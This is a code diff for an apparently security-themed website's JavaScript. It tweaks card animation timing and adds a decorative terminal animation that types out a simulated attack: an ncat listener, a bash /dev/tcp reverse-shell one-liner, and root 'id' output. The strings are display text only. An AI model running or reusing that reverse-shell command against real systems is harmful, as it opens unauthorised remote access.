@@ -10,32 +10,10 @@
 
   // Stagger cards on index grid
   const cards = Array.from(document.querySelectorAll('.grid .card'));
-  cards.forEach((el,i)=>{ el.classList.add('reveal'); el.style.transitionDelay = (i*70)+'ms'; });
+  cards.forEach((el,i)=>{ el.classList.add('reveal'); el.style.transitionDelay = (i*25)+'ms'; });
 })();
 
-// Hero terminals typing (attacker-only command entry)
-(function(){
-  const attacker = document.querySelector('[data-ty="a"]'); // attacker
-  const victim   = document.querySelector('[data-ty="b"]'); // victim
-  if(!attacker || !victim) return;
 
-  const seqAttacker = [
-    "id",
-    "uid=0(root) gid=0(root) groups=0(root)"
-  ];
-
-  function typeLine(el, str, delay){
-    return new Promise(resolve => {
-      let i = 0;
-      (function step(){
-        if(i < str.length){
-          el.textContent += str.charAt(i++);
-          setTimeout(step, delay);
-        } else {
-          el.textContent += "\n";
-          resolve();
-        }
-      })();
     });
   }
 
@@ -93,7 +71,63 @@
   }, {threshold: .09});
   Array.from(container.children).forEach((el,i)=>{
     el.classList.add('reveal');
-    el.style.transitionDelay = (i*35)+'ms';
+    el.style.transitionDelay = (i*25)+'ms';
     io.observe(el);
   });
+})();
+
+// Hero terminals typing: reverse shell simulation then attacker runs `id`
+(function(){
+  const A = document.querySelector('[data-ty="a"]'); // attacker
+  const B = document.querySelector('[data-ty="b"]'); // victim
+  if(!A || !B) return;
+
+  const attackerSeq = [
+    {kind:'cmd', text:'ncat -lvnp 4444'},
+    {kind:'out', text:'listening on [any] 4444 ...'},
+    {kind:'out', text:'connection received from 10.10.10.42'},
+    {kind:'cmd', text:'id'},
+    {kind:'out', text:'uid=0(root) gid=0(root) groups=0(root)'}
+  ];
+
+  const victimSeq = [
+    {kind:'cmd', text:'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'}
+  ];
+
+  function typeLine(el, str, delay){
+    return new Promise(resolve => {
+      let i = 0;
+      (function step(){
+        if(i < str.length){
+          el.textContent += str.charAt(i++);
+          setTimeout(step, delay);
+        } else {
+          el.textContent += "\\n";
+          resolve();
+        }
+      })();
+    });
+  }
+
+  async function run(){
+    A.textContent = "";
+    B.textContent = "";
+    await typeLine(A, attackerSeq[0].text, 16);
+    await typeLine(A, attackerSeq[1].text, 10);
+    await typeLine(B, victimSeq[0].text, 12);
+    await typeLine(A, attackerSeq[2].text, 12);
+    await typeLine(A, attackerSeq[3].text, 16);
+    await typeLine(A, attackerSeq[4].text, 12);
+  }
+
+  const grid = document.querySelector('.term-grid');
+  let played = false;
+  const io = new IntersectionObserver((entries)=>{
+    entries.forEach(e=>{
+      if(e.isIntersecting && !played){
+        played = true; run(); io.unobserve(e.target);
+      }
+    });
+  }, {threshold: .10});
+  if(grid) io.observe(grid); else run();
 })();
